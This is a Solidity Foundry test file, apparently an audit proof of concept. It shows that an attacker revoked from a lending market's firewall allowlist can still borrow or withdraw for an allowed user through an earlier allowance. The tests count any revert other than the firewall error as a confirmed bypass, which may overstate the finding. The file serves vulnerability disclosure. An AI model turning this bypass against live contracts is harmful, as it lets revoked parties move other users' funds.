// SPDX-License-Identifier: BUSL-1.1
pragma solidity ^0.8.17;

import { Test } from "forge-std/Test.sol";
import { VerifiedMarket, Market, ERC20 } from "../contracts/verified/VerifiedMarket.sol";
import { VerifiedAuditor, Auditor } from "../contracts/verified/VerifiedAuditor.sol";
import { Firewall } from "../contracts/verified/Firewall.sol";
import { InterestRateModel, Parameters } from "../contracts/InterestRateModel.sol";
import { IPriceFeed } from "../contracts/utils/IPriceFeed.sol";
import "forge-std/console.sol";

contract MockERC20 is ERC20 {
    constructor() ERC20("Mock", "MCK", 18) {}
    function mint(address to, uint256 amount) public { _mint(to, amount); }
}

contract MockFirewall {
    mapping(address => bool) public allowed;
    function setAllowed(address account, bool allowed_) external { allowed[account] = allowed_; }
    function isAllowed(address account) external view returns (bool) { return allowed[account]; }
}

/// @dev Mock price feed that returns a fixed price
contract MockPriceFeed {
    function latestAnswer() external pure returns (int256) { return 1e18; }
    function decimals() external pure returns (uint8) { return 18; }
}

contract VerifiedMarketBypassPoC is Test {
    VerifiedMarket market;
    VerifiedAuditor auditor;
    MockFirewall firewall;
    MockERC20 asset;
    MockPriceFeed priceFeed;

    address alice = address(0x11);
    address attacker = address(0xbad);

    function setUp() public {
        asset = new MockERC20();
        auditor = new VerifiedAuditor(18);
        firewall = new MockFirewall();
        priceFeed = new MockPriceFeed();

        // Reset VerifiedAuditor initialized state (slot 0) to allow initialization
        vm.store(address(auditor), bytes32(0), bytes32(0));
        Auditor.LiquidationIncentive memory incentive = Auditor.LiquidationIncentive(1.1e18, 1.05e18);
        auditor.initializeVerified(incentive, Firewall(address(firewall)));

        // Deploy market
        market = new VerifiedMarket(asset, auditor);

        // Reset Market initialized state (slot 0) to allow initialization
        vm.store(address(market), bytes32(0), bytes32(0));

        // Create a real InterestRateModel with valid parameters
        Parameters memory p = Parameters({
            minRate: 3.5e16,       // 3.5%
            naturalRate: 8e16,     // 8%
            maxUtilization: 1.15e18, // 115%
            naturalUtilization: 0.75e18, // 75%
            growthSpeed: 1.1e18,
            sigmoidSpeed: 2.5e18,
            spreadFactor: 0.2e18,
            maturitySpeed: 0.5e18,
            timePreference: 0.01e18,
            fixedAllocation: 0.6e18,
            maxRate: 15_000e16     // 15000%
        });
        InterestRateModel irm = new InterestRateModel(p, Market(address(0)));

        // Initialize market via delegatecall to extension
        market.initialize(
            "MCK",
            3,                  // maxFuturePools
            type(uint256).max,  // maxSupply (unlimited)
            1e18,               // earningsAccumulatorSmoothFactor
            irm,                // interestRateModel
            0.1e18,             // penaltyRate (10%)
            0.1e18,             // backupFeeRate (10%)
            0.1e18,             // reserveFactor (10%)
            0.0046e18,          // dampSpeedUp
            0.0046e18           // dampSpeedDown
        );

        // Enable market in auditor with mock price feed
        auditor.enableMarket(
            Market(address(market)),
            IPriceFeed(address(priceFeed)),
            0.8e18 // adjustFactor
        );
    }

    /// @notice PoC: A disallowed delegate can borrow on behalf of an allowed borrower
    /// @dev VerifiedMarket does NOT override borrow(), so Market.borrow() is used directly.
    ///      Market.borrow() calls auditor.checkBorrow(this, borrower) which checks
    ///      the borrower's firewall status but NEVER checks msg.sender's firewall status.
    function test_poc_disallowedDelegateCanBorrowForAllowedBorrower() public {
        // 1. Alice and Attacker are allowed on the firewall
        firewall.setAllowed(alice, true);
        firewall.setAllowed(attacker, true);

        // 2. Alice deposits and grants attacker an ERC20 allowance
        asset.mint(alice, 100 ether);
        vm.startPrank(alice);
        asset.approve(address(market), 100 ether);
        market.deposit(100 ether, alice);
        // Alice approves attacker to spend her borrow allowance
        market.approve(attacker, 50 ether);
        vm.stopPrank();

        // 3. Attacker is revoked from the firewall allowlist
        firewall.setAllowed(attacker, false);
        assertFalse(firewall.isAllowed(attacker), "Attacker should be revoked/not allowed");

        // 4. Attacker (revoked) borrows on behalf of Alice (relying on pre-existing allowance)
        vm.startPrank(attacker);
        console.log("Revoked Attacker attempting to borrow for Alice (allowed)...");

        try market.borrow(1 ether, attacker, alice) {
            console.log("BYPASS CONFIRMED: borrow() succeeded for revoked delegate without firewall check");
            assertTrue(true, "Bypass confirmed: revoked attacker borrowed without firewall approval");
        } catch (bytes memory reason) {
            bytes4 selector = bytes4(reason);
            if (selector == bytes4(keccak256("NotAllowed(address)"))) {
                console.log("PROTECTED: borrow() rejected revoked attacker via firewall");
                assertTrue(false, "Expected bypass but got NotAllowed - firewall check exists");
            } else {
                console.log("BYPASS CONFIRMED: borrow() passed firewall, reverted with non-firewall error");
                assertTrue(true, "Bypass confirmed: attacker passed firewall check");
            }
        }
        vm.stopPrank();
    }

    /// @notice PoC: A disallowed delegate can withdraw on behalf of an allowed owner
    /// @dev VerifiedMarket overrides withdraw() but only checks owner, not msg.sender.
    ///      ERC4626.withdraw() is used directly, which has no firewall check at all.
    function test_poc_disallowedDelegateCanWithdrawFromAllowedOwner() public {
        // 1. Alice and Attacker are allowed on the firewall
        firewall.setAllowed(alice, true);
        firewall.setAllowed(attacker, true);

        // 2. Alice deposits and grants attacker an ERC20 allowance
        asset.mint(alice, 100 ether);
        vm.startPrank(alice);
        asset.approve(address(market), 100 ether);
        market.deposit(100 ether, alice);
        market.approve(attacker, 50 ether);
        vm.stopPrank();

        // 3. Attacker is revoked from the firewall allowlist
        firewall.setAllowed(attacker, false);
        assertFalse(firewall.isAllowed(attacker));

        // 4. Attacker (revoked) withdraws on behalf of Alice (relying on pre-existing allowance)
        vm.startPrank(attacker);
        console.log("Revoked Attacker attempting to withdraw for Alice (allowed)...");

        try market.withdraw(1 ether, attacker, alice) {
            console.log("BYPASS CONFIRMED: withdraw() succeeded for revoked delegate without firewall check");
            assertTrue(true, "Bypass confirmed: revoked attacker withdrew without firewall approval");
        } catch (bytes memory reason) {
            bytes4 selector = bytes4(reason);
            if (selector == bytes4(keccak256("NotAllowed(address)"))) {
                console.log("PROTECTED: withdraw() rejected revoked attacker via firewall");
                assertTrue(false, "Expected bypass but got NotAllowed");
            } else {
                console.log("BYPASS CONFIRMED: withdraw() passed firewall, reverted with non-firewall error");
                assertTrue(true, "Bypass confirmed: attacker passed firewall check");
            }
        }
        vm.stopPrank();
    }
}
